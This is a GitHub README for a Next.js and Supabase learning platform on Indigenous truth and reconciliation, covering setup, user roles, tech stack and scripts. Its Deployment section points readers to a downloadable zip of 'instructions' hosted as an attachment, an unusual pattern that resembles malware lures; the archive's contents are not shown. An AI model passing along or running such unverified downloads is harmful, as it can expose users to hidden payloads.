<h1 align="center">⚡ Builder's League: Edition 1 ⚡</h1>

<h3 align="center">
 Reconciliation Road Challenge
</h3>

<div align="center">

<img alt="GitHub License" src="https://img.shields.io/github/license/michaeltroya/supa-next-starter">
</div>

<br/>

<p align="center">
  <a href="#Requirements"><strong>Requirements</strong></a> ·
  <a href="#Install-and-Run"><strong>Clone and run locally</strong></a> ·
  <a href="#documentation"><strong>Documentation</strong></a> ·
  <a href="#feedback-and-issues"><strong>Feedback and issues</strong></a>
</p>
<br/>

# Project Overview

The CBH app is a Indigenous education resource platform where users are able to access to truth & reconciliation knoweldge. Also, it works as a social media platform where users can share their thoughts and ideas about resources. It advocates education, inspiration, and interaction.

# Requirements

- Node.js >= 18.17.0
- Docker
- Payload CMS Repo: https://github.com/Builder-s-League/CMS-Payload.git

# Install and Run

1. You'll first need a Supabase project, which can be made [via the Supabase dashboard](https://database.new) or running locally using the follow command:

   ```bash
   npx supabase start
   ```

2. Copy and rename `.env.example` to `.env` and update the following:

   ```
   NEXT_PUBLIC_SUPABASE_URL=[INSERT SUPABASE PROJECT URL]
   NEXT_PUBLIC_SUPABASE_ANON_KEY=[INSERT SUPABASE PROJECT API ANON KEY]
   ```

   Both `NEXT_PUBLIC_SUPABASE_URL` and `NEXT_PUBLIC_SUPABASE_ANON_KEY` can be found in two distinct ways:

   1 - By accessing the Supabase [your Supabase project's API settings](https://app.supabase.com/project/_/settings/api)

   2 - Or on the start command output in step 1 if you use it locally.

   If you prefer to run Supabase locally, you can stop all services using this command:

   ```bash
   npx supabase stop
   ```

3. You can now run the Next.js local development server:

   ```bash
   npm run dev
   ```

   The starter kit should now be running on [localhost:3002](http://localhost:3002/).

> Check out [the docs for Local Development](https://supabase.com/docs/guides/getting-started/local-development) to also run Supabase locally.

# Deployment

For a quick and easy deployment that doesn't create much hassle, download the instructions below:
[deploy-builders-league.zip](https://github.com/user-attachments/files/20823635/deploy-builders-league.zip)

If you are planning to use the instruction, the minimum spec for a VM is 2 cores and 8 GB of RAM ("e2-standard-2" in GCP). We tried using a custom VM with 2 cores and 4GB to reduce cost, but the installation is very unstable.

# Documentation

## Scope

The CBH app is a multi-user platform designed for learning management and collaboration. It supports three user roles with distinct functionalities:

CBH (Service Provider):

- Manages organizations and users, including HR administrators and employees.
- Creates, updates, and deletes (CUD) course content.
- Schedules content delivery and manages user-generated content (e.g., public notes and external content links).
- Collects and reviews user feedback.
- Designs and sends out surveys to employees.

HR (Client Organizations):

- Manages employees (users) within their organization.
- Oversees user-generated content, including public notes and external content links.

Users (Employees of the Client Organization):

- Access course content through the Learning Management System (LMS).
- Create private or public notes linked to specific content.\
- Share external articles on a shared feed.
- Engage with the community feed to view others' public notes and shared content.
- Provide feedback through a dedicated feedback button or respond to surveys sent by CBH.

To have a detailed understanding of the project, we have Breadboard and Fat Markers Sketches:

Breadboard: https://excalidraw.com/#room=89227fcc04f45ba6a0fc,-acIFbbAaHe94JsrGv85EQ

Fat Markers Sketches:

1. Employee: https://excalidraw.com/#room=df100b80af790dbfe300,5-wsEbpqQ8QxuD9qiuy8Eg

2. CBH: https://excalidraw.com/#room=5e1c7e3a393c2474dc16,c8lH3_lGzZnbQqG9dmlarw

3. HR : https://excalidraw.com/#room=7b63764a003c00a48a2e,NmWS8hGd8-NV9kMIN6Dinw

## ERD

![Blank diagram](https://github.com/user-attachments/assets/6b28add5-0c8c-43eb-8fdf-a93386fbce4c)

## Tech Stack

- ⚡️ Next.js 14 (App Router)
- 💚 Supabase w/ supabase-ssr - Works across the entire [Next.js](https://nextjs.org) stack (App Router, Pages Router, Client, Server, Middleware, It just works!)
- ⚛️ React 18
- ⛑ TypeScript
- 📦 npm - package manager
- 🎨 [Tailwind](https://tailwindcss.com/)
- 🔌 [shadcn/ui](https://ui.shadcn.com/) - Beautifully designed components that you can copy and paste into your apps.
- 🧪 Jest w/SWC + React Testing Library - Unit tests for all of your code.
- 🎛️ [MSW](https://mswjs.io/)v2 - Intercept requests inside your tests (set up for testing only)
- 🪝[TanStackQuery](https://tanstack.com/query/v5)v5 - The best way to fetch data on the client
- 📏 ESLint — To find and fix problems in your code
- 💖 Prettier — Code Formatter for consistent style
- 🐶 Husky — For running scripts before committing
- 🚫 lint-staged — Run ESLint and Prettier against staged Git files
- 👷 Github Actions — Run Type Checks, Tests, and Linters on Pull Requests
- 🗂 Path Mapping — Import components or images using the `@` prefix
- ⚪⚫ Dark mode - Toggle theme modes with [next-themes](https://github.com/pacocoursey/next-themes)
- ✨ Next Top Loader - Render a pleasent top loader on navigation with [nextjs-toploader](https://github.com/TheSGJ/nextjs-toploader)
- 🔋 Lots Extras - Next Bundle Analyzer, Vercel Analytics, Vercel Geist Font.

## Scripts

- `npm run dev` — Starts the application in development mode at `http://localhost:3002`.
- `npm run build` — Creates an optimized production build of your application.
- `npm run start` — Starts the application in production mode.
- `npm run type-check` — Validate code using TypeScript compiler.
- `npm run lint` — Runs ESLint for all files in the `src` directory.
- `npm run format-check` — Runs Prettier and checks if any files have formatting issues.
- `npm run format` — Runs Prettier and formats files.
- `npm run test` — Runs all the jest tests in the project.
- `npm run test:ci` — Runs all the jest tests in the project, Jest will assume it is running in a CI environment.
- `npm run analyze` — Builds the project and opens the bundle analyzer.

## Paths

TypeScript is pre-configured with custom path mappings. To import components or files, use the `@` prefix.

```tsx
import { Button } from '@/components/ui/Button'

// To import images or other files from the public folder
import avatar from '@/public/avatar.png'
```

## License

This project is licensed under the MIT License - see the [LICENSE.md](LICENSE.md) file for more information.

## Feedback and issues

Please file feedback and issues [here](https://github.com/Builder-s-League/BuildersLeague-Edition1/issues).
